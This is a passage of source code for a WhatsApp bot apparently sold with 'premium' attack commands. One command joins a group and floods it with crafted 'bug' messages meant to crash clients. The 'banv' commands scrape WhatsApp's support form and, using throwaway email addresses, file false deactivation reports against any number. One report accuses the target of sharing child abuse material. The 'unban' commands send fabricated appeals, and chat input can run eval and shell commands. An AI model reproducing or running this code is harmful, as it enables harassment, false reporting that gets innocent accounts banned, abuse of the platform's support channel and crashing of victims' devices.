                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(xeongc, order.message, {
              messageId: order.key.id,
            });
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;
      case "docugcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await XliconBotInc.groupAcceptInvite(result);
          amount = "15";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              xeongc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;

      //ban/unban cases
      case "out":
      case "verif":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append("your_message", "Perdido/roubado: desative minha conta");
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv1":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv2":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv3":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv4":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv5":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv6":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv1":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv2":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv3":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv4":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv5":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await XliconBotInc.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replygcXlicon(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          XliconBotInc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;

      default:
        if (budy.startsWith("=>")) {
          if (!XeonTheCreator) return XliconStickOwner();
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return replygcXlicon(bang);
          }
          try {
            replygcXlicon(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            replygcXlicon(String(e));
          }
        }

        if (budy.startsWith(">")) {
          if (!XeonTheCreator) return XliconStickOwner();
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await replygcXlicon(evaled);
          } catch (err) {
            await replygcXlicon(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!XeonTheCreator) return XliconStickOwner();
          exec(budy.slice(2), (err, stdout) => {
            if (err) return replygcXlicon(err);
            if (stdout) return replygcXlicon(stdout);
          });
        }
        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith("broadcast")) return;
          if (m.isBaileys) return;
          let msgs = global.db.data.database;
          if (!(budy.toLowerCase() in msgs)) return;
          XliconBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {
            quoted: m,
          });
        }
    }
  } catch (err) {
    console.log(util.format(err));
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("already-exists")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Socket connection timeout")) return;
  }
};
